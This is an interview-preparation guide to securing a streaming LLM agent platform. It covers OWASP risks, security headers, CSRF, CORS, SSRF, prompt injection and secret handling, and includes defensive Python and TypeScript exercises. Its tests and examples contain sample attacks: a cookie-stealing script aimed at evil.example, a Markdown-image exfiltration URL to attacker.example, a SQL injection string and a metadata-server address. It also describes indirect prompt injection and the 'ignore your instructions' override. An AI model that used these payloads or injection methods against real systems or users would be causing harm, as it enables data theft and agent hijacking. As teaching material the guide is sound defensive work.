---
title: Web and LLM application security
goal: Name the current OWASP risks for web, API and LLM applications, and explain concretely how you would protect a streaming agent platform against XSS, CSRF, SSRF, prompt injection and leaked secrets.
minutes: 50
---

The JD asks for "enterprise-grade web applications ... adhering to strict security and accessibility standards", and the platform's agents call enterprise APIs. That combination makes security a likely topic: the classic web risks (XSS, CSRF, CORS, injection) still apply to the React app and APIs, and an agentic platform adds new ones. Model output is untrusted HTML, tools that fetch URLs are SSRF waiting to happen, documents and tool results can carry prompt injections, and an over-privileged agent turns any of these into real damage.

Strong answers here name the risk, show the specific defence (a header, a check, a design rule), and say why defence in depth matters. The identity side (OAuth, OIDC, SAML, RBAC) is in [Enterprise identity](#/auth-identity).

## The lists to know

**OWASP Top 10:2025** (web applications; the 2021 list had SSRF as its own entry, now folded into access control):

| # | Risk | One-line example on this platform |
|---|---|---|
| A01 | Broken Access Control | Changing `/runs/123` to another tenant's run returns it; an agent tool fetches an internal URL (SSRF) |
| A02 | Security Misconfiguration | A Cloud Run service deployed with "allow unauthenticated" by mistake; verbose error pages |
| A03 | Software Supply Chain Failures | A compromised npm package or GitHub Action in the build |
| A04 | Cryptographic Failures | Tokens over plain HTTP, weak HMAC secrets, home-made crypto |
| A05 | Injection | SQL built with string formatting; shell commands from tool arguments |
| A06 | Insecure Design | An agent that can create purchase orders with no approval step |
| A07 | Authentication Failures | No MFA at the IdP, JWTs accepted without checking `aud` |
| A08 | Software or Data Integrity Failures | Unsigned webhooks accepted; unsafe deserialisation |
| A09 | Security Logging and Alerting Failures | Nobody is alerted when an agent makes 500 failed tool calls |
| A10 | Mishandling of Exceptional Conditions | The policy service times out and the code "fails open" |

**OWASP Top 10 for LLM Applications (2025):** LLM01 Prompt Injection, LLM02 Sensitive Information Disclosure, LLM03 Supply Chain, LLM04 Data and Model Poisoning, LLM05 Improper Output Handling, LLM06 Excessive Agency, LLM07 System Prompt Leakage, LLM08 Vector and Embedding Weaknesses, LLM09 Misinformation, LLM10 Unbounded Consumption.

**OWASP Top 10 for Agentic Applications (published December 2025)** goes further for autonomous agents: agent goal hijack, tool misuse and exploitation, identity and privilege abuse, agentic supply chain, unexpected code execution, memory and context poisoning, insecure inter-agent communication, cascading failures, human-agent trust exploitation, and rogue agents.

## A baseline of response headers

| Header | Value to start from | Why |
|---|---|---|
| `Content-Security-Policy` | `script-src 'nonce-…' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'` plus `connect-src` for your APIs and `wss:` streams | Stops injected scripts from running; blocks framing |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains` | Forces HTTPS after the first visit |
| `X-Content-Type-Options` | `nosniff` | Stops browsers guessing content types (a JSON response treated as HTML) |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Keeps paths and query strings out of other sites' logs |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Turns off powerful features you do not use |
| `Cache-Control` | `no-store` on API responses with user data | Keeps sensitive data out of shared caches |
| `Set-Cookie` | `__Host-session=…; Secure; HttpOnly; SameSite=Lax; Path=/` | The `__Host-` prefix forces Secure, no Domain and Path=/ |

## Interview questions

### Walk me through the OWASP Top 10 and how it applies to this platform. {core}

The 2025 list, in order: broken access control, security misconfiguration, software supply chain failures, cryptographic failures, injection, insecure design, authentication failures, software or data integrity failures, security logging and alerting failures, and mishandling of exceptional conditions. Access control is still number one, and it now includes SSRF.

For an agent platform I would highlight four: object-level access checks on every run and stream (tenant isolation), SSRF through tools that fetch URLs, supply chain (npm and container images in the CI pipeline), and insecure design, meaning agents that can take high-impact actions without approval. Then mention that OWASP's LLM and agentic lists add prompt injection, improper output handling and excessive agency.

### How does React protect against XSS, and where does it not? {core}

React escapes every value you render as text, so `{message.content}` containing `<script>` shows as text and does not run. That covers most cases, and it is why you should render model output as text or through a sanitising Markdown renderer.

React does not protect you when you opt out or step outside text: `dangerouslySetInnerHTML` with unsanitised HTML; `href` and `src` values (React 19 replaces `javascript:` URLs with one that throws, where React 16.9 to 18 only warned, but `data:` URLs and links you build outside React are still your job); inline event handlers built from strings; injecting data into a `<script>` tag during server rendering (serialise state with escaping); and third-party libraries that write to `innerHTML`. Defence in depth: sanitise any HTML with DOMPurify, allow only `http`, `https` and `mailto` URLs, and add a strict Content-Security-Policy so an injected script cannot run even if one slips through.

### How do you render LLM output safely in the chat UI? {core}

Treat model output exactly like user input from a stranger, because a prompt injection can make the model emit anything. Render it as Markdown into React elements with raw HTML disabled (for example `react-markdown` without `rehype-raw`), or, if you must allow some HTML, pass it through an allow-list sanitiser such as DOMPurify before it touches the DOM. Never pass it to `dangerouslySetInnerHTML` raw, and never `eval` code the model wrote.

Then handle the details: links only with safe schemes and `rel="noopener noreferrer"` (and show the real domain), no remote images by default (see the exfiltration question), syntax-highlight code blocks without executing them, and on the server, never pass model output straight into SQL, shell commands or tool calls without validating it against a schema. This is OWASP LLM05, Improper Output Handling.

### What is a Content-Security-Policy, and how would you roll out a strict one? {core}

CSP is a response header that tells the browser which sources of scripts, styles, images, frames and connections are allowed. A strict policy makes most XSS harmless: even if an attacker injects a `<script>`, the browser refuses to run it. The modern recommendation is nonce-based: `script-src 'nonce-<random per response>' 'strict-dynamic'; object-src 'none'; base-uri 'none'`, rather than long host allow-lists that are easy to bypass.

Roll it out with `Content-Security-Policy-Report-Only` first, collect violation reports (the `report-to` directive), fix inline scripts and handlers, then enforce. For a static Vite build served from a CDN or bucket, per-response nonces are not possible, so use hash-based sources for the few inline scripts, or have the BFF serve `index.html` with a nonce. Do not forget `connect-src`: it must list your API origin and the `wss:` origin of your streaming endpoint, or the chat stops working.

### What is CSRF, and how do SameSite cookies help? {core}

Cross-site request forgery makes a signed-in user's browser send a request to your site from another site, riding on cookies the browser attaches automatically. With cookie-based sessions (for example a BFF), a hostile page could submit a form that cancels a run or approves an action.

Defences, layered: `SameSite=Lax` or `Strict` on the session cookie, so it is not sent on cross-site subrequests (Chrome treats cookies without the attribute as Lax, but set it explicitly); never change state on `GET`; require a custom header or anti-CSRF token on state-changing requests (a cross-site form cannot set custom headers without a CORS preflight that you refuse); and check the `Origin` header. APIs authenticated with `Authorization: Bearer` headers are not exposed to classic CSRF, because browsers never add that header by themselves.

### What is CORS, and does it protect your API? {core}

CORS is a browser mechanism that relaxes the same-origin policy: by default a page on one origin cannot read responses from another origin, and the server opts in with `Access-Control-Allow-Origin` and related headers. For non-simple requests (an `Authorization` header, a JSON body, `PUT` or `DELETE`) the browser sends an `OPTIONS` preflight first. You cannot use `*` with credentials, so list exact origins, and never reflect whatever `Origin` arrives.

It does not protect the server. curl, scripts and other servers ignore CORS entirely; it only controls which web pages may read responses inside a browser. Authentication and authorisation are still required on every endpoint.

```python
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.testclient import TestClient

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://console.example.com"],  # exact origins, never "*" with credentials
    allow_methods=["GET", "POST"],
    allow_headers=["Authorization", "Content-Type"],
    allow_credentials=True,
)


@app.get("/runs")
def runs() -> list[dict]:
    return []


client = TestClient(app)
preflight = {"Access-Control-Request-Method": "GET", "Access-Control-Request-Headers": "Authorization"}
ok = client.options("/runs", headers={"Origin": "https://console.example.com", **preflight})
assert ok.status_code == 200
assert ok.headers["access-control-allow-origin"] == "https://console.example.com"

blocked = client.options("/runs", headers={"Origin": "https://evil.example", **preflight})
assert blocked.status_code == 400 and "access-control-allow-origin" not in blocked.headers

# The server still answers a direct request; only a browser would refuse to hand it to the page.
direct = client.get("/runs", headers={"Origin": "https://evil.example"})
assert direct.status_code == 200 and "access-control-allow-origin" not in direct.headers
```

### What is clickjacking, and how do you prevent it? {deep}

Clickjacking loads your app in an invisible iframe on a hostile page and tricks the user into clicking your buttons, for example "Approve" on a pending agent action. Prevent it with `Content-Security-Policy: frame-ancestors 'none'` (or a list of the exact origins allowed to embed you); the older `X-Frame-Options: DENY` is the fallback for very old browsers. For especially sensitive actions, require a fresh confirmation step that cannot be completed with one blind click.

### What is SSRF, and why do agent tools make it a top risk? {core}

Server-side request forgery is when an attacker gets your server to make a request on their behalf, to a place they cannot reach themselves: internal services, databases with HTTP interfaces, or the cloud metadata server (`169.254.169.254` / `metadata.google.internal` on GCP, which hands out service account tokens). GCP's metadata server requires a `Metadata-Flavor: Google` header, which stops the simplest attacks, but do not rely on it: a tool that lets the model set headers defeats it. Any feature that fetches a URL is a candidate.

Agents make it worse, because a "fetch this URL" or "call this webhook" tool takes its arguments from a model that can be steered by prompt injection. Defences: an allow-list of destinations per tool where possible; otherwise allow only `https`, resolve the hostname and refuse private, loopback, link-local and metadata addresses, then connect to the IP you checked (so DNS rebinding cannot swap it); disable redirects or re-check every hop; send egress through a proxy or firewall that enforces the same rules (on GCP, VPC egress controls and VPC Service Controls around sensitive APIs); and give the service account behind the tool as few permissions as possible. The coding problem below builds the URL check.

### What is prompt injection, and how do you defend against it? {core}

Prompt injection is text that makes the model follow the attacker's instructions instead of yours. Direct injection comes from the user typing "ignore your instructions". Indirect injection is the dangerous one for agents: the instructions hide in content the agent reads, such as a web page, an email, a PDF, a ticket or a tool result, and the model may then call tools with the attacker's intent. OWASP ranks it LLM01, and there is no complete fix inside the prompt.

So design for it: assume the model can be hijacked and limit what a hijacked model can do. Concretely: least-privilege tools and scoped credentials; human approval before side effects (sending, paying, deleting, creating orders); validate every tool call against a schema and policy outside the model (allowed tool, allowed arguments, this user's permissions); keep untrusted content clearly separated from instructions and never let it change which tools are available; restrict outbound destinations so data cannot be exfiltrated; and log and monitor tool calls. Research designs such as CaMeL (Google DeepMind, 2025) go further: a privileged model plans from the trusted user request only, a quarantined model with no tool access reads the untrusted data, and the system tracks where each value came from before any tool may use it.

**Your angle:** the agentic workflows at Quantiphi had tool-use boundaries, validation loops and HITL checkpoints. Those are exactly these controls: say which ones you used and why.

### What is "excessive agency", and how do you give an agent the least privilege it needs? {core}

Excessive agency (OWASP LLM06) is an agent having more functionality, permissions or autonomy than the task requires: a "read invoices" tool that can also delete them, an agent running with an admin service account, or high-impact actions with no human check. When anything goes wrong (a prompt injection, a hallucinated argument, a bug) the blast radius is everything the agent could do.

Reduce it on three axes. **Functionality:** offer narrow tools (`get_invoice(id)`), not generic ones (`run_sql`, `http_request`). **Permissions:** each tool calls downstream systems with a scoped, ideally user-delegated credential, so the enterprise system's own access control still applies. **Autonomy:** classify actions by impact and require approval above a threshold, with dry-run previews, per-run budgets (steps, tokens, money) and rate limits. Then log every tool call with the run, the user and the arguments.

### How do you prevent injection beyond SQL?

The rule is the same everywhere: keep code and data separate, and never build an interpreter's input by concatenating untrusted strings. For SQL use parameterised queries or an ORM; for shell commands do not use a shell at all (`subprocess.run([...])` with an argument list, or `execFile` in Node, never `shell=True` or `exec` with a string); for templates, never render user input as a template; for NoSQL, validate types so `{"$ne": null}` cannot arrive where a string was expected; for LDAP and XPath, use the library's escaping.

```python
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE runs (id TEXT, tenant TEXT)")
db.executemany("INSERT INTO runs VALUES (?, ?)", [("r1", "acme"), ("r2", "globex")])

attack = "x' OR '1'='1"
unsafe = db.execute(f"SELECT id FROM runs WHERE tenant = '{attack}'").fetchall()  # never do this
safe = db.execute("SELECT id FROM runs WHERE tenant = ?", (attack,)).fetchall()
assert unsafe == [("r1",), ("r2",)]  # the attacker read every tenant's runs
assert safe == []  # the value was compared as data, not executed as SQL
```

For agents the same idea applies to tool arguments: validate them against a strict schema (types, enums, lengths, patterns) before they reach any system.

### What is insecure deserialisation, and what is prototype pollution? {deep}

Insecure deserialisation is turning untrusted bytes into objects with a format that can execute code: Python's `pickle.loads`, `yaml.load` without `SafeLoader`, Java native serialisation. Use data-only formats (JSON) and validate them with a schema (Pydantic, zod); never unpickle anything that crossed a trust boundary, including cached objects in a shared Redis.

Prototype pollution is the JavaScript cousin: a recursive merge or `set(obj, path, value)` that accepts the key `__proto__` (or `constructor.prototype`) writes onto `Object.prototype`, so every object in the process suddenly has an `isAdmin` property. Defend by rejecting those keys in merge and path helpers, using `Object.create(null)` or `Map` for dictionaries of user-controlled keys, and validating input with a schema that strips unknown keys.

### How do you manage secrets for services on Google Cloud? {core}

Store them in Secret Manager, never in source code, container images (layers keep them forever), Terraform state in plain text, or CI logs. Cloud Run can expose a secret as an environment variable (resolved when the instance starts) or a mounted file (read at access time, so rotation can take effect without a redeploy); pin a version for predictable deploys or use `latest` with care. The service's own service account gets `roles/secretmanager.secretAccessor` on just the secrets it needs.

Better still, avoid secrets: use service account identity and Workload Identity Federation instead of key files, and OAuth client credentials with short-lived tokens for enterprise APIs. Rotate what remains, enable secret scanning with push protection in the repository, and make sure logs and error reports never print environment variables or request headers.

### How do you secure the software supply chain?

Assume dependencies and build tools can be compromised, because they are: in 2025 a phished maintainer account pushed malware into very popular npm packages such as `chalk` and `debug`, a self-spreading worm (Shai-Hulud) stole npm tokens to publish more, and the `tj-actions/changed-files` GitHub Action was tampered with so that it printed CI secrets into workflow logs. The controls: commit lockfiles and install with `npm ci`; review new dependencies; pin GitHub Actions to commit SHAs and container base images to digests; run dependency and image scanning (Dependabot, `npm audit`, Artifact Analysis); give CI short-lived credentials through Workload Identity Federation instead of stored keys; and generate SBOMs and build provenance (SLSA) so you know what shipped.

On the developer side, disabling install scripts where possible and waiting a few days before adopting brand-new versions both reduce exposure to freshly published malicious releases.

### How do you protect LLM endpoints from abuse and runaway cost? {deep}

This is OWASP LLM10, Unbounded Consumption: attackers (or bugs, or a looping agent) can burn tokens, money and capacity. Put limits at every level: request size and maximum output tokens; per-user and per-tenant rate limits and token quotas (Redis counters or an API gateway); per-run budgets for agents (maximum steps, tool calls, wall-clock time, cost) with a hard stop; maximum stream duration and idle timeouts on SSE and WebSocket connections; and concurrency limits towards the model provider so one tenant cannot starve the others.

Then make cost observable: record tokens per request, run and tenant, alert on anomalies, and return a clear 429 with `Retry-After` the UI can show.

### What should security logging look like for an agent platform?

Log who did what, to what, when, from where, and with what outcome: sign-ins and failures, permission denials, role changes, and every agent tool call with run ID, user, tenant, tool, a summary or hash of the arguments, the approver if any, and the result. Use structured JSON logs with correlation and trace IDs so a single run can be followed across the UI, the orchestrator and the tools.

Never log secrets, tokens, cookies or full request bodies with personal data; redact them at the logging layer. Keep audit logs append-only (on GCP, a log bucket with a locked retention policy, or a sink to a locked storage bucket), and remember the 2025 name of the category: logging **and alerting**. Logs nobody watches do not help, so alert on spikes in denials, tool errors and token use.

### What does "mishandling exceptional conditions" mean in practice? {deep}

It is new in the 2025 Top 10: errors, timeouts and odd states that leave the system insecure or inconsistent. The most important rule is to **fail closed**: if the policy service, the token validation or the approval lookup fails, deny the action instead of letting it through. Next: do not leak stack traces, SQL or internal hostnames in error responses; catch and handle exceptions at boundaries so a half-finished operation does not leave partial state; set timeouts on every outbound call; and do not blindly retry side-effecting calls after a timeout, because the first attempt may have succeeded (see [Enterprise integration](#/enterprise-integration)).

For agents, a tool error must become a structured result the orchestrator handles, not an exception that skips the approval step.

### Which security headers do you set on every response?

A Content-Security-Policy (nonce-based scripts, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`, and a `connect-src` that lists the API and streaming origins), HSTS, `X-Content-Type-Options: nosniff`, a `Referrer-Policy` such as `strict-origin-when-cross-origin`, a `Permissions-Policy` that turns off unused features, and `Cache-Control: no-store` on responses with user data. Session cookies get `Secure`, `HttpOnly`, `SameSite` and ideally the `__Host-` prefix.

Set them in one place (the BFF, middleware, or the load balancer's custom response headers) and test them in CI, so a refactor cannot silently drop them.

### How would you threat-model a new agent tool before it ships? {deep}

Draw the data flow: who triggers the tool, what input it takes (including model-generated arguments and untrusted content), which credentials it uses, and which systems it touches. Then walk STRIDE over each step: Spoofing (whose identity does it act as?), Tampering (can arguments or results be altered or injected?), Repudiation (is every call audited?), Information disclosure (what could it leak, and where can data leave?), Denial of service (can it be looped or flooded?), Elevation of privilege (can a prompt injection make it do more than the user could?).

The output is a short list of controls: schema validation, allow-lists, scoped credentials, approval thresholds, rate limits, audit events, and tests for the abuse cases. Doing it before shipping is far cheaper than after an incident.

### How can a chat UI leak data with no XSS at all? {deep}

Through Markdown images and links. If an injected instruction makes the model output `![](https://attacker.example/c?d=<summary of the conversation>)` and the UI renders images, the browser fetches that URL and sends the data to the attacker the moment the message appears, with no click. Links work the same way when the user clicks them, and link previews or unfurling bots fetch them automatically.

Defences: do not render remote images from model output (or allow only your own image hosts), enforce it with CSP `img-src 'self'` so it holds even if rendering changes, show the real destination of links and do not auto-fetch previews, and restrict where tools can send data. This is why "render model output safely" means more than escaping HTML.

## Coding problems

### Sanitise HTML with an allow-list {medium core}

The assistant may return a little HTML (bold, lists, links, code). Write `sanitize(html)` in Python that keeps only an allow-list of tags with no attributes except a safe `href` on links, drops dangerous elements together with their content (`script`, `style`, `iframe`, `svg`, and so on), escapes all text, and closes any tags left open. Links may use only `http`, `https` or `mailto`, including after browsers' URL clean-up, so `java&#x09;script:` must not slip through.

#### Hints

1. Subclass `html.parser.HTMLParser` with `convert_charrefs=True`: it decodes entities in text and attribute values, so you see what the browser would see.
2. Track a "skip depth" while inside a dropped element, and a stack of open allowed tags so you can close them properly.
3. Browsers remove tabs and newlines inside URLs and trim leading control characters and spaces; do the same before checking the scheme with `urllib.parse.urlsplit`.

#### Solution

Re-build the document from scratch instead of trying to remove bad parts: only allowed tags are written out, attributes are never copied except a validated `href`, and every text node is escaped. Production code uses a maintained sanitiser (DOMPurify in the browser, `nh3` in Python, since `bleach` is deprecated); writing one shows you understand why allow-lists beat block-lists.

```python
from html import escape
from html.parser import HTMLParser
from urllib.parse import urlsplit

ALLOWED = {"p", "br", "b", "strong", "i", "em", "code", "pre", "ul", "ol", "li", "blockquote", "a"}
VOID = {"br"}
DROP_WITH_CONTENT = {"script", "style", "iframe", "object", "template", "noscript", "svg", "math", "textarea", "title", "select"}
SAFE_SCHEMES = {"http", "https", "mailto"}
C0_AND_SPACE = "".join(chr(c) for c in range(0x21))


def safe_href(value: str | None) -> str | None:
    if not value:
        return None
    cleaned = value.translate({9: None, 10: None, 13: None}).strip(C0_AND_SPACE)  # what browsers do
    return cleaned if urlsplit(cleaned).scheme.lower() in SAFE_SCHEMES else None


class Sanitizer(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.out: list[str] = []
        self.open: list[str] = []
        self.skip = 0  # depth inside a dropped element such as <script>

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag in DROP_WITH_CONTENT:
            self.skip += 1
            return
        if self.skip or tag not in ALLOWED:
            return  # unknown tags vanish, their text is kept
        if tag == "a":
            href = safe_href(dict(attrs).get("href"))
            self.out.append(f'<a href="{escape(href)}" rel="nofollow noopener noreferrer">' if href else "<a>")
        else:
            self.out.append(f"<{tag}>")  # every attribute (onclick, style, class) is dropped
        if tag not in VOID:
            self.open.append(tag)

    def handle_endtag(self, tag: str) -> None:
        if tag in DROP_WITH_CONTENT:
            self.skip = max(0, self.skip - 1)
            return
        if self.skip or tag not in self.open:
            return
        while self.open:  # close anything opened inside this element, so output stays well formed
            closed = self.open.pop()
            self.out.append(f"</{closed}>")
            if closed == tag:
                break

    def handle_data(self, data: str) -> None:
        if not self.skip:
            self.out.append(escape(data, quote=False))

    def result(self) -> str:
        self.close()
        while self.open:
            self.out.append(f"</{self.open.pop()}>")
        return "".join(self.out)


def sanitize(html: str) -> str:
    parser = Sanitizer()
    parser.feed(html)
    return parser.result()


assert sanitize("<p>Run <b>r-7</b> finished</p>") == "<p>Run <b>r-7</b> finished</p>"
assert sanitize("<p>Hi</p><script>fetch('//evil.example?c='+document.cookie)</script>") == "<p>Hi</p>"
assert sanitize("<img src=x onerror=alert(1)>") == ""
assert sanitize('<a href="https://docs.example.com/x" onclick="steal()">docs</a>') == (
    '<a href="https://docs.example.com/x" rel="nofollow noopener noreferrer">docs</a>'
)
for sneaky in ["javascript:alert(1)", "java&#x09;script:alert(1)", " JAVASCRIPT:alert(1)", "javascript&colon;alert(1)", "data:text/html,x"]:
    assert sanitize(f'<a href="{sneaky}">x</a>') == "<a>x</a>", sneaky
assert sanitize("1 < 2 & 3 > 2") == "1 &lt; 2 &amp; 3 &gt; 2"
assert sanitize("&lt;script&gt;") == "&lt;script&gt;"  # encoded text stays text
assert sanitize('<p style="x">a<br/>b</p>') == "<p>a<br>b</p>"
assert sanitize("<b>unclosed") == "<b>unclosed</b>"
assert sanitize("<p>a<em>b</p>c") == "<p>a<em>b</em></p>c"
assert sanitize("<svg><script>alert(1)</script></svg>after") == "after"
assert sanitize("<script>never closed") == ""
assert sanitize("<embed src=x>still here") == "still here"
assert '"onmouseover' not in sanitize("""<a href='https://x.example/"onmouseover="a'>x</a>""")
```

Complexity: O(n) in the input size, one pass of the parser.

#### Follow-ups

- **Why not a block-list of bad tags?** Browsers parse HTML in surprising ways (SVG, MathML, mutation XSS), and new attack vectors appear; an allow-list only ever outputs what you understood.
- **Where should sanitising happen?** At render time in the browser (DOMPurify), because the same text may be shown in different contexts; also add CSP so a sanitiser bug is not enough.

### Guard an agent's fetch tool against SSRF {medium core}

An agent tool fetches documents for the model. Write `check_url(url, resolve)` that returns the IP address to connect to, or raises `ValueError`. Rules: only `https`, no credentials in the URL, host must be on an allow-list (case-insensitive, trailing dot ignored), port 443 only, and every address the host resolves to must be publicly routable (no private, loopback, link-local, metadata, CGNAT or multicast addresses, including IPv4-mapped IPv6 and the NAT64 and 6to4 forms that embed an IPv4 address). `resolve(host)` is injected so you can test DNS rebinding.

#### Hints

1. Use `urlsplit` and its `.hostname` (lowercased, without userinfo or port) rather than string tricks; `https://allowed.example@evil.example/` is a request to `evil.example`.
2. `ipaddress.ip_address(x).is_global` is False for private, loopback, link-local and shared ranges; multicast needs its own check, and `ipv4_mapped` unwraps `::ffff:10.0.0.1`.
3. Return the checked IP: the HTTP client must connect to that address (with the original host name for TLS and `Host`), or DNS could answer differently the second time.

#### Solution

```python
import ipaddress
from collections.abc import Callable
from urllib.parse import urlsplit

ALLOWED_HOSTS = {"api.vendor.example", "docs.partner.example"}
# IPv6 ranges that embed an IPv4 address a gateway may translate to (NAT64, 6to4): refuse them outright.
TRANSLATED = [ipaddress.ip_network(n) for n in ("64:ff9b::/96", "64:ff9b:1::/48", "2002::/16")]


def check_url(url: str, resolve: Callable[[str], list[str]]) -> str:
    parts = urlsplit(url)
    if parts.scheme != "https":
        raise ValueError("only https")
    if parts.username is not None or parts.password is not None:
        raise ValueError("credentials in URL")
    host = (parts.hostname or "").rstrip(".")
    if host not in ALLOWED_HOSTS:
        raise ValueError("host not allowed")
    try:
        port = parts.port
    except ValueError:
        raise ValueError("bad port") from None
    if port not in (None, 443):
        raise ValueError("port not allowed")
    addresses = resolve(host)
    if not addresses:
        raise ValueError("does not resolve")
    for raw in addresses:
        ip = ipaddress.ip_address(raw)
        if isinstance(ip, ipaddress.IPv6Address):
            if any(ip in net for net in TRANSLATED):
                raise ValueError(f"resolves to a non-public address {raw}")
            if ip.ipv4_mapped:
                ip = ip.ipv4_mapped
        if not ip.is_global or ip.is_multicast:
            raise ValueError(f"resolves to a non-public address {raw}")
    return addresses[0]


public = lambda host: {"api.vendor.example": ["8.8.8.8"], "docs.partner.example": ["2001:4860:4860::8888"]}[host]
assert check_url("https://api.vendor.example/v1/invoices?id=7", public) == "8.8.8.8"
assert check_url("https://API.Vendor.Example./v1", public) == "8.8.8.8"
assert check_url("https://docs.partner.example:443/a.pdf", public) == "2001:4860:4860::8888"


def why(url: str, resolve: Callable[[str], list[str]] = public) -> str:
    try:
        check_url(url, resolve)
    except ValueError as error:
        return str(error)
    return "allowed"


assert why("http://api.vendor.example/") == "only https"
assert why("https://api.vendor.example@evil.example/") == "credentials in URL"  # really a request to evil.example
assert why("https://user:pw@api.vendor.example/") == "credentials in URL"
assert why("https://api.vendor.example.evil.net/") == "host not allowed"
assert why("https://evil.example#@api.vendor.example") == "host not allowed"
assert why("https://api.vendor.example:8443/") == "port not allowed"
assert why("https://169.254.169.254/computeMetadata/v1/") == "host not allowed"
for internal in ["10.0.0.5", "127.0.0.1", "169.254.169.254", "100.64.0.1", "0.0.0.0", "::1", "fd00::1", "::ffff:10.0.0.1", "64:ff9b::a00:5", "2002:a00:5::1", "224.0.0.1"]:
    assert why("https://api.vendor.example/", lambda h, ip=internal: [ip]).startswith("resolves to a non-public"), internal
# DNS rebinding: one good answer is not enough if any answer is internal.
assert why("https://api.vendor.example/", lambda h: ["8.8.8.8", "10.0.0.5"]).startswith("resolves to a non-public")
```

Complexity: O(a) in the number of resolved addresses.

#### Follow-ups

- **What if the tool must fetch arbitrary public URLs (a browsing agent)?** Drop the host allow-list but keep the scheme, port and address checks, send all egress through a proxy that enforces them, cap response size and time, and never forward the agent's credentials.
- **Redirects?** Disable automatic redirects and run `check_url` on every `Location` before following it.

### Build a strict Content-Security-Policy with a per-request nonce {easy}

Write `buildCsp({ nonce, connect, reportTo })` in TypeScript that returns a strict CSP header value for the chat app: nonce-based scripts with `'strict-dynamic'`, no plugins, no `<base>` hijacking, no framing, images only from the app's own origin, and `connect-src` listing the given API and streaming origins. Reject a nonce shorter than 128 bits and any `connect` entry that is not an `https://` or `wss://` origin.

#### Hints

1. Generate the nonce per response with `randomBytes(16).toString('base64')`, and put the same value in `nonce="..."` on your script tags.
2. Validate each `connect` entry with `new URL()`: protocol `https:` or `wss:`, and nothing after the origin.
3. Join directives with `; `. Keep `'self'` in `connect-src` so same-origin `fetch` keeps working.

#### Solution

```ts
import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';

export function buildCsp(opts: { nonce: string; connect: string[]; reportTo?: string }): string {
  if (Buffer.from(opts.nonce, 'base64').length < 16) throw new Error('nonce must be at least 128 bits');
  for (const source of opts.connect) {
    const url = new URL(source);
    if (!['https:', 'wss:'].includes(url.protocol) || url.origin !== source.replace(/\/$/, '')) {
      throw new Error(`connect-src must be an https or wss origin: ${source}`);
    }
  }
  const directives: Record<string, string[]> = {
    'default-src': ["'self'"],
    'script-src': [`'nonce-${opts.nonce}'`, "'strict-dynamic'"],
    'style-src': ["'self'", `'nonce-${opts.nonce}'`],
    'img-src': ["'self'"], // no remote images: blocks Markdown-image data exfiltration
    'connect-src': ["'self'", ...opts.connect],
    'object-src': ["'none'"],
    'base-uri': ["'none'"],
    'frame-ancestors': ["'none'"],
    'form-action': ["'self'"],
  };
  const parts = Object.entries(directives).map(([name, values]) => `${name} ${values.join(' ')}`);
  if (opts.reportTo) parts.push(`report-to ${opts.reportTo}`);
  return parts.join('; ');
}

const nonce = randomBytes(16).toString('base64');
const csp = buildCsp({ nonce, connect: ['https://api.example.com', 'wss://stream.example.com'], reportTo: 'csp' });
assert.ok(csp.includes(`script-src 'nonce-${nonce}' 'strict-dynamic'`));
assert.ok(csp.includes("connect-src 'self' https://api.example.com wss://stream.example.com"));
assert.ok(csp.includes("object-src 'none'") && csp.includes("frame-ancestors 'none'") && csp.endsWith('report-to csp'));
assert.ok(!csp.includes('unsafe-inline') && !csp.includes('*'));
assert.throws(() => buildCsp({ nonce: 'c2hvcnQ=', connect: [] }), /128 bits/);
assert.throws(() => buildCsp({ nonce, connect: ['http://api.example.com'] }), /https or wss/);
assert.throws(() => buildCsp({ nonce, connect: ['https://api.example.com/v1/runs'] }), /https or wss/);
assert.throws(() => buildCsp({ nonce, connect: ['*'] }), /Invalid URL/);
assert.notEqual(randomBytes(16).toString('base64'), nonce); // a fresh nonce for every response
```

Complexity: constant. `report-to csp` names an endpoint you declare in a separate `Reporting-Endpoints: csp="https://…"` header. The real work is operational: start in report-only mode and watch the reports.

#### Follow-ups

- **Why `'strict-dynamic'`?** Scripts loaded by an already-trusted (nonced) script are trusted too, so bundlers and lazy-loaded chunks work without listing hosts, while injected inline scripts still fail.
- **Static SPA with no server?** Use hash sources for inline scripts, or move all script into external files and use `script-src 'self'`.

### Redact secrets and personal data before logging {easy}

Agent runs log tool inputs and outputs for debugging. Write `redact(line)` in Python that replaces bearer tokens, JWTs, API-key-looking values in `key=value` pairs, and email addresses with placeholders, so a log line can be stored safely.

#### Hints

1. JWTs are three base64url segments separated by dots and usually start with `eyJ` (base64 of `{"`).
2. Match `Authorization: Bearer <token>` before the generic JWT rule, and keep the label so the log stays readable.
3. For `key=value` pairs, match the key name case-insensitively (`api_key`, `token`, `password`, `secret`) and replace only the value.

#### Solution

```python
import re


def _secret_value(m: re.Match[str]) -> str:
    value = '"[REDACTED]"' if m[3].startswith('"') else "[REDACTED]"  # a quoted JSON value keeps its quotes
    return f"{m[1]}{m[2]}{value}"


RULES = [
    (re.compile(r"(?i)(authorization:\s*bearer\s+)\S+"), r"\1[REDACTED]"),
    (re.compile(r"\beyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"), "[JWT]"),
    # key=value, key: value and JSON "key": "value"
    (re.compile(r'(?i)\b(api[_-]?key|token|password|secret|client_secret)("?\s*[=:]\s*)("[^"]*"|[^\s,&"]+)'), _secret_value),
    (re.compile(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b"), "[EMAIL]"),
]


def redact(line: str) -> str:
    for pattern, replacement in RULES:
        line = pattern.sub(replacement, line)
    return line


assert redact("Authorization: Bearer abc.def.ghi") == "Authorization: Bearer [REDACTED]"
assert redact("tool=fetch token=sk_live_123 status=200") == "tool=fetch token=[REDACTED] status=200"
assert redact('cfg {"api_key": "AIzaXYZ", "region": "us-central1"}') == 'cfg {"api_key": "[REDACTED]", "region": "us-central1"}'
